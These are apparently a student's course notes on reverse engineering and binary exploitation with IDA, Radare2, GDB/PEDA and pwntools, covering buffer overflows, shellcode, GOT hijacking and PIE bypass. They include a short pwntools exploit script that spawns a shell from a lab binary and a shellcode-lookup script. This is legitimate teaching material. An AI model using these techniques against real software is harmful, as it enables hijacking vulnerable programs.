Some useful tools for the second part of the Cybersecurity course @UniPd


## Requirements
- Disassembler -> we use ***Ida***
    - *to download Ida (free version):* https://www.hex-rays.com/ida-free/
- Hexadecimal editor -> we use ***Radare2*** (alternative: *Hex Editor*)
    - *to download Radare:* https://github.com/radareorg/radare2
- Debugger -> we use ***GDB***
    - it should already been installed if you have Linux *(on Windows you will need to install it, please note that in this case MinGW distributes a Windows version of it)*
- Other tools useful for pwning:
    - ***PEDA*** *(i.e. Python Exploit Development Assistance for GDB)* available to download at: https://github.com/longld/peda
    - ***pwntool*** *(python library)*, available to download at: http://docs.pwntools.com/en/stable/ or simply by doing ```pip install pwntools```

> ***PLEASE NOTE:***  Before doing anything it's necessary to change the permissions of the directory we want to work on. We can achieve this with:   ``` chmod -R +x ./ ```


## Some useful commands
Let's see some commands (available to use on terminal) that might be useful for Reverse Engineering and Pwning:
- ***./name_of_the_program***
    - to simply run a program in the terminal
- ***cat ./text_file***
    - to read the files specified as parameters and display the concatenation of their content
- ***strings ./name_of_the_program***
    - to display all the strings used inside the program (e.g. if there is a psw or a flag stored it should appear)
- ***objdump -option ./name_of_the_program***
    - to display information about one or more object files. The options control what particular information to display, we can for example choose the option -d (--disassemble) which display the ASM code of the input files.
- ***checksec ./name_of_the_program***
    - to display details (+ security properties) regarding the executable file *(e.g. architecture 32bit/64bit so we know the size of the registers)*. In particular, it outputs:
        1. the architecture (32-64bit + little/big endian)
        2. RELRO, which stands for *Relocation Read-Only*, and if enabled (completely) it makes the GOT *(i.e. the "Global Offset Table" of ELF executable files used to resolve functions dynamically)* read-only, which prevents some form of relocation attacks (GOT hijacking). If enabled partially, it makes only the global variables read-only.
        3. CANARY, they are special known values placed  between a buffer and control data on the stack to monitor buffer overflows. In this way, they can control that the function return to the real previous function
        4. NX, which stands for *Non-Executable*, it's often enabled by default and in that case the stack is non-executable (basically NX enabled can mark certain areas of memory as non-executable). This is done because often buffer-overflow exploits put code on the stack and then try to execute it. However, making this writable area non-executable can prevent such attacks.
        5. PIE, which stands for *Position Independent Executable*,  it's code that is placed somewhere in memory for execution regardless of its absolute address (basically the addresses are shifted of a (common) offset. 


## Ida
### Basics 
To open Ida from terminal:
```
cd idafree-8.1/
./ida64
```
To disassemble a file click on *New* and then *Ok* on the *Quick Start* window that opens up. You should now see all the ASM code of the program on the right side 
(included the branches generated by the jump instructions) and the various functions on the left side.
You can also change the view from "graph view" to "text view" by simply pressing the space bar on the keyboard.

From "text view" we are now able to patch the instructions by doing: ``` Edit -> Patch program -> Assemble ``` . Once we have changed/patched the instruction (and clicked on OK), then we need to actually apply the patch to the original program by doing: ``` Edit -> Patch program -> Apply patches to input file -> OK ```.

> ***PLEASE NOTE:*** When changing the type of view in Ida, if we have highlighted/selected some instruction, we will be able to see that instruction highlighted/selected in the other type of view as well.

### Patching with Ida
We can also patch instructions on Ida by changing the actual hexadecimal values. We pass to "Hex View" so we can see the hex of the instruction we want to patch. Then as before we can patch it by doing: ``` Edit -> Patch program -> Patch byte ``` and then apply the patch to the original program as before.

> ***PLEASE NOTE:*** The instructions are identified in hex with their opcode. So if you want to change an instruction you need to change the hex/opcode with the one you want. You can find all the opcodes with the corresponding instruction at: http://ref.x86asm.net/coder64.html 
In particular, please note that the opcode for the NOP instruction is 90.


## Radare2
### Basics
Radare2 is very useful for patching *(e.g. we can fill with NOP, invert or remove them and also paste new functions)*. In particular, we can use it for change some constant (since the free version of Ida doesn't really allow us to do so).

Let's see some Radare commands (that we use on the terminal) that help us doing it:
- To open the file using Radare2 *(-w to enable writing on it)* and launch tha analysis:
    ```
    r2 -w name_of_the_file
    aaaa
    ```
    > ***PLEASE NOTE:*** it's recommended doing a copy of the file and working with radare on it, rather than the original one
- To move to the start of a function or a specific address:
    ```C
    s name_of_the_function
    //or similarly
    s address
    ```
- To print the the decompiled function (once you've moved to the corresponding memory address) simply use:
    ```
    pdf
    ```
    In this way you will be able to see on your left the memory addresses, on the center the bytes that make up the instructions and on the right the instructions themselves.
- To disply all the functions and their memory address where they're store we simply use:
    ```C
    afl     //which stands for Analyse Function List
    ```


### Patching with Radare2
To patch the instruction (once you've moved to the corresponding memory address) you can use:
```C
//to patch the assembly instructions
wa new_instruction_in_ASM
//to patch the bytes
wx new_bytes
```
> ***PLEASE NOTE:*** you can double check the correctness of the patch with ```pdf```


## GDB (included PEDA)
### Basics
To run a file using GDB, i.e. debugging it:
```C
gdb name_of_the_file
//to initially run the program and make it stop at the most convenient spot:
start
```
or also
```C
gdb name_of_the_file
//add breakpoints
run
```
In this last way, the program will stop at the first breakpoint *(please note that if there are no breakpoints, it will run your program to completion without debugging it at all, unless of course the program crashes. In that case, gdb will stop and allow you to debug it)*. 

> ***PLEASE NOTE:*** If you don't add breakpoints, you can still stop the program while it's running by typing ```(ctrl) + c```. Gdb will stop your program at whatever line it has just executed. From here you can examine variables and move through your program.

### About breakpoints (and how to resume the program)
To add a breakpoint:
```C
b*memory_address
//or similarly
break name_of_the_function
```

> ***PLEASE NOTE:*** Breakpoints stay set when your program ends, so you do not have to reset them unless you quit gdb and restart it. 

Other useful commands regarding breakpoints:
- To list current breakpoints: ```info break```
- To delete a breakpoint: ```del breakpoint_number```
- To delete all breakpoints from a specific function: ```clear name_of_the_function```
- To temporarily disable a breakpoint: ```dis breakpoint_number```
- To enable a breakpoint: ```en breakpoint_number```
- To ignore a breakpoint until it has been crossed x times: ```ignore breakpoint_number x```

On the other hand you might want:
- To execute one line of code:
    - just type ```step``` or ```s```. If the line to be executed is a function call, gdb will step into that function and start executing its code one line at a time. If you want to execute the entire function with one keypress, type ```next``` or ```n```.
- To resume normal execution:
    - just type ```continue``` or ```c```. In this way, gdb will run until your program ends, your program crashes, or gdb encounters a breakpoint. 
    > ***PLEASE NOTE:***  In this way you can also loop the program n times just by typing: ```c n_times```
- To resume execution at another function of the program:
    - just type ```jump name_of_the_function ```

### Examining data with gdb
To show information about the current state of the program you can use the keyword info, for example:
- to show the current conent of the registers type ``` info registers ```
- to show the current variables type ``` info variables ```

> ***PLEASE NOTE:*** If you just type info, it will show you all the possible subcommands.

Sometimes, the content of register or variables might be an hexadecimal (in the form 0x...), so it might be useful to print the variable as a string. This is (of course) only possible when the program has been runned and it's stopped at a breakpoint and can simply be achieved by typing:
```C
printf "%s", (char *) var_address       // (char*) is in brackets because is optional
//or similarly
x/s var_address        // in general  is i
```
> ***PLEASE NOTE:*** We use in general ```x / Format Address_expression``` to show in a specific format *(i.e. s for strings, b for bytes...)* a piece of memory, which could be an address in hexadecimal or a register (in this case remember to use $ before the name of the register). *Example: we use ```x/200bx $esp``` to display the stack in bytes (x for hexadecimal which is optional since is the default). Alternatively, we could use rsp instead of esp but the syntax is the same*.

Other commands used to examine data when your program is stopped:
   - To check the assembly code of the program:
        - type ```disassemble name_of_the_function``` or ```disas name_of_the_function```
   - To show all the calls done until that moment:
        - type ```bt```, which stands for *backtrace*

### Cyclic patterns
When trying to pwn and, in particular, trying to do a stack overflow, it might be tricky to find the return address from the start of the buffer (that we want to overflow). To help us find it we can create a pattern (cyclic) and insert it into the buffer in order to see what part of the pattern overwrites the return address.
In this way, we can understand the difference in bytes, i.e. the offset (ret_addr - buff_addr), which is the "garbage"/"padding" we need to put in the buffer to overflow it and reach the start of the return address (where we will put our new address). Basically our input will then be ```garbage_of_length_offset + address_we_want_to_reach```.
- To create the pattern we can use the command: 
    ```
    pattern_create n name_of_the_pattern_file
    ``` 
    where:
    - *n* reppresent the length of the pattern which must be way bigger than the size of the buffer *(e.g. if the buffer size is 128, we can create a pattern long 300)
    - *name_of_the_pattern_file* rappresent the new file which will be created in the current directoy to save the pattern
- To run the program using a pattern as input:
    ```C
    r < name_of_the_pattern_file  
    // or similarly 
    run < name_of_the_pattern_file
    ```
    This should cause a segmentation fault and create an errore in the PC address (i.e. the IP, instruction Pointer) which will result invalid and which correspond to a piece of our pattern. 
- To finally see the offset we can type on the terminal:
    ```
    pattern search
    ```
    We look at the registers that contain our pattern, and in particular to the IP/PC one (which name is EIP). It will show the offset we were looking for.

> ***PLEASE NOTE:*** If the program crash but there are no information about the IP address not being valid, we can search for the pattern code that cause the crash by looking at the character displayed in the stack (the upper frame), usually the first 8 chars are enough, and then search them with ```pattern search stack_chars```. Then we look at the register containing the pattern, and in particular at the RSP/ESP (the stack pointer), and it will show the offset we were looking for.


## Pwntools
### Basics: Processes and Communication
In this course, we aim to corrupt the memory of programs mainly by overflowing buffers. However, since sometimes it's time-consuming to do this by hand we can use a python script to do this for us. This is possible thanks to a python library called pwntools.

Firstly, we need to include the library pwntools in our python script:
```python
from pwn import *
```

Generally, then you will have to create a *"tube"* to talk to a process (i.e. connecting the script with the process you want to pwn). This can be achieved by creating a process object just like this:
```python
new_obj_name = process(path/name_of_the_process)
```
> ***PLEASE NOTE:*** from now on we will call *"new_obj_name"* just *"p"* (which stands for process) for convenience.

Once we have written our python script we can run it from terminal by doing:
```
python name_pf_the_script
```

### Sending and receiving data from processes
Now that we have a connection between the process and the python script we can use different (pwntool's) functions depending on our aim:
- To send data
    ```python
    p.send(data)              #sends data to the process (as if writing a string in terminal)    
    p.sendline(line)          #sends data plus a newline to the process (as if writing a string in terminal)  
    p.sendlineafter("_str_", line)      #sends data to the process (as if writing a string in terminal) only after reading a string specified by _str_ 
    ```
     > ***PLEASE NOTE:*** We can send the data to the process packed as bytes using the syntax ```b'string'``` (or with ```("string").encode('ascii')```) instead of strings, since sometimes there can be some problems with them. 
- To receive data
    ```python
    msg = p.recvall()           #msg will store all the prints from the execution in terminal of the process
    msg = p.recv(n)             #as above, but it will receive any number (n) of available bytes
    msg = p.recvline()          #receive data until a newline is encountered
    ```

### Packing
To pack data *(e.g. from the address in hex 0x... to bytes)* pwntools uses the context global variable (by default little endian) to automatically calculate how the packing should work. This is possible thanks to the function:
```python
//if we compile in a 64-bit architecture
packed_bytes = p64(data_to_pack)
//or if we compile in a 32-bit architecture
packed_bytes = p32(data_to_pack)
```
> ***PLEASE NOTE:*** p64() returns a bytes-like object *(e.g. b'some_bytes')*, so if you need to add padding to it remember to use b'A' instead of using just 'A'.

> ***PLEASE NOTE:*** It's also possible to unpack bytes by using ```u64(packed_bytes)```, which is the exact opposite of p64().

### Interactive sessions
We might also want to interact derectly with our process (on the terminal), i.e. we want to use the process in interactive mode to send commands and receive output from the process at runtime.
We do this using:
```python
# exploit goes here
p.interactive()
```
 > ***PLEASE NOTE:***  This is very common when the exercise involves the opening of a shell *(then you can use as a normal shell)*. So in this case remember to use this interactive mode rather than doing a recvall() which will not do anything good (the python script will continue to run and never stop).

### ELF
ELF is a class of pwntools that it's very useful because it allows use to retrieve some information from the ELF file (i.e. the executable in Linux) without having to use debuggers, disassembler etc...
Whatever you need to do with this class, firstly we need  to create an elf object (which basiacally represent the program):
```python
name_of_elf_object = ELF('path/name_of_the_program')
```
Some usefull stuff we can do is:
- find the address (in hex) of a function:
  ```python
  address = name_of_elf_object.symbols['name_of_the_function']
  ```






> ***FOCUS: HOW TO FIND A SHELLCODE*** If you'd like to do a shellcode attack you need to input in the buffer some code that opens a shell *(i.e. usually the vulnerability is a gets(buffer) where you can overflow the buffer and put as return address the start of the buffer where you have the code of the shell).* This shellcode can be find at https://shell-storm.org/shellcode/index.html where there are different shellcodes based on architecture and features. You can search manually or do a simple python program to search it for you. The code of this program can be e.g.:
> ```python
> import requests
> 
> keyword1 = "bash"       #we want a bash shell
> keyword2 = "execve"     #we want a shell that is able to execute a program referred to by pathname
> shellcodes = "http://shell-storm.org/api/?s=" + keyword1 + "*" + keyword2           #filter the shellcodes based on the keywords
>
> response = requests.get(shellcodes)
> possible_shellcodes = response.content      #get the possible shellcodes (filtered before)
> print(possible_shellcodes)      #prints the name and the link where to find the suitable shellcodes
> ```
> Then you can search for the most suitable between the choices in the print (please make sure to look at the correct architecture and at the bytes needed for the shellcode).

```
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = asm(shellcraft.sh())          # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4)              # Address of the Shellcode

p.sendline(payload)

p.interactive()
```


```
GOT thing that allows a c program to call libc libraries and sereve as a jumping point for the porgram (we can try to hijack it especially if aslr is enabled because there things stay constant). if we modify the jumping point we can make the program execute code at a different address than intended.
to extract the got address (offset in the table) of a function (of the porgram) we can use radare2:
in particular (after aaaa and r2 opening even without write mode), do a afl 
1st address of the function (to know the new function where we want to jump where it is)
2nd colomn: The number of basic blocks in the function
3rd column: The size of the function (in bytes)
4th column: The function's name
now we use the 
pd n @ offset: Print n opcodes/instruction forward disassembled, where n is the number of basic blocks in the funcion and offset is the function that we're gonna modify with the function we want to.          (same as doing pdf @ offset)
the relocated address is given by the address at the end after the jmp to the ()word of relocation.


So what is all of this nonsense about? Well, there’s two types of binaries on any system: statically linked and dynamically linked. Statically linked binaries are self-contained, containing all of the code necessary for them to run within the single file, and do not depend on any external libraries. Dynamically linked binaries (which are the default when you run gcc and most other compilers) do not include a lot of functions, but rely on system libraries to provide a portion of the functionality. For example, when your binary uses printf to print some data, the actual implementation of printf is part of the system C library.
In order to locate these functions, your program needs to know the address of printf to call it. While this could be written into the raw binary at compile time, there’s some problems with that strategy:

    Each time the library changes, the addresses of the functions within the library change, when libc is upgraded, you’d need to rebuild every binary on your system. While this might appeal to Gentoo users, the rest of us would find it an upgrade challenge to replace every binary every time libc received an update.
    
    Modern systems using ASLR load libraries at different locations on each program invocation. Hardcoding addresses would render this impossible.

Consequently, a strategy was developed to allow looking up all of these addresses when the program was run and providing a mechanism to call these functions from libraries. This is known as relocation, and the hard work of doing this at runtime is performed by the linker (actually run before any code)

.got
    This is the GOT, or Global Offset Table. This is the actual table of offsets as filled in by the linker for external symbols.
.plt
    This is the PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the .got.plt section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to .got.plt yet.)
    
On the other hand, the .got.plt section is basically a giant array of function pointers! Maybe we could overwrite one of these and control execution from there. Essentially, any memory corruption primitive that will let you write to an arbitrary (attacker-controlled) address will allow you to overwrite a GOT entry.
or you can use*****


Every library function used by the program
has an entry there that contains an address where the real function is located.
This is done to allow easy relocation of libraries within the process memory
instead of using hardcoded addresses. Before the program has used the
function the first time the entry contains an address of the run-time-linker
(rtl). If the function is called by the program the control is passed to the rtl
and the functions real address is resolved and inserted into the GOT. Every
call to that function passes the control directly to it and the rtl is not called
anymore for this function. 

By overwriting a GOT entry for a function the program will use after
the format string vulnerability has been exploited we can seize control and
can jump to any executeable address. This unfortunately means that any
stack based protections, which perform checks on the return address will
fail.
The big advantage we gain from overwriting a GOT entry is its indepen-
dance to environment variables (such as the stack) and dynamic memory
allocation (heap). The address of a GOT entry is only fixed per binary, so
if two systems have the same binary running, then the GOT entry is always
at the same address.


PIE is a precondition to enable address space layout randomization (ASLR). ASLR is a security feature where the kernel loads the binary and dependencies into a random location of virtual memory each time it's run.


*****
ou can see where the GOT entry for a function is by running:
objdump --dynamic-reloc ./name_of_the_file
The address of the real function (or the rtl linking function) is directly
at the printed address.



per logging and context guarda il segnalibro quello del rop pwntools

Many settings in pwntools are controlled via the global variable context, such as the selected target operating system, architecture, and bit-width.

In general, exploits will start with something like:

from pwn import *
context.arch = 'amd64'

Which sets up everything in the exploit for exploiting a 64-bit Intel binary.

The recommended method is to use context.binary to automagically set all of the appropriate values.

from pwn import *
context.binary = './challenge-binary'       Absorb settings from an ELF file

context.binary is an ELF object (e.g. is the elf of the binary given before, so elf = context.binary is just like name_of_elf_object = ELF('path/name_of_the_program') but it actually makes a copy of binary)

process parameter can have context.binary.path  (we need os for this) instead of ./name
In order for the shellcode to be correct, we're going to set context.binary to our binary; this grabs stuff like the arch, OS and bits and enables pwntools to provide us with working shellcode.
We can use just process() because once context.binary is set it is assumed to use that process

Now we want to send a payload that leaks the real address of puts. As mentioned before, calling the PLT entry of a function is the same as calling the function itself; if we point the parameter to the GOT entry, it'll print out it's actual location. This is because in C string arguments for functions actually take a pointer to where the string can be found, so pointing it to the GOT entry (which we know the location of) will print it out.


puts_got = elf.got['puts']is the address of the relocation (i.e. is the same as looking for the relocation address in pd .... with radare2) while we can use elf.symbols to get the address of the function that we want to call instead of the puts


Manipulating integers

    pack(int) - Sends a word-size packed integer
    unpack() - Receives and unpacks a word-size integer

PIE 
the base address of ELF files i.e name_elf_file.address     Simply setting elf.address will automatically update all the function and symbols addresses for you,


PIE stands for Position Independent Executable, which means that every time you run the file it gets loaded into a different memory address. This means you cannot hardcode values such as function addresses and gadget locations without finding out where they are.
PIE executables are based around relative rather than absolute addresses, meaning that while the locations in memory are fairly random the offsets between different parts of the binary remain constant. For example, if you know that the function main is located 0x128 bytes in memory after the base address of the binary, and you somehow find the location of main, you can simply subtract 0x128 from this to get the base address and from the addresses of everything else.
Due to the way PIE randomisation works, the base address of a PIE executable will always end in the hexadecimal characters 000. This is because pages are the things being randomised in memory, which have a standard size of 0x1000

So, all we need to do is find a single address and PIE is bypassed. 
if PIE is active it means the .symbols won't recover the correct address so we have to find it with:
we can do that with main:
main = io.unpack() where io is the instance of the process
elf.symbols['main'] 
so the base address of ELF is actually (to update all symbols) name_elf_file.address = main - elf.symbols['main'] 
then now that we have the correct address of all symbols we can do as before and find theelf.got ['function_we_want_to_change']  and wld.symbols['function we want to have']
then we pack it as io.pack(...) io.pacK(...) and then enjoy the shell
```
